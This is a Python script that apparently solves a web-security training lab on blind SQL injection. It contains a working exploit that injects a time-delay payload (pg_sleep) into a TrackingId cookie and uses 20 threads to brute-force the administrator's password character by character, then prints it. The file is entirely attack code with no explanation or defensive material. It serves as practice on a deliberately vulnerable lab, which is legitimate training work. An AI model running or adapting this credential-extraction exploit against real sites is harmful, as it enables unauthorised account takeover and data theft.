# LAB: Blind SQL injection with time delays and information retrieval

import requests
from threading import Thread
import time

start_time = time.time()

# URL LAB ID
url = 'https://0a6b003203197b8782bbac52007b00e1.web-security-academy.net'

threads = []
admin_pass = [''] * 20

def find_character(i):
    for ascii_value in range(32,127):
        response = requests.get(url, cookies={"TrackingId" : f"' || (select case when (ascii(substr(password, {i+1}, 1)) = {ascii_value}) then pg_sleep(10) else NULL end from users where username='administrator' ) -- "})
        if response.elapsed.total_seconds() >= 10:
            admin_pass[i] = chr(ascii_value)
            return

for i in range(20):
    threads.append(Thread(target=find_character, args=(i,)))
    threads[i].start()

for i in range(20):
    threads[i].join()

print(f"Administrator password: {''.join(admin_pass)}")
print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))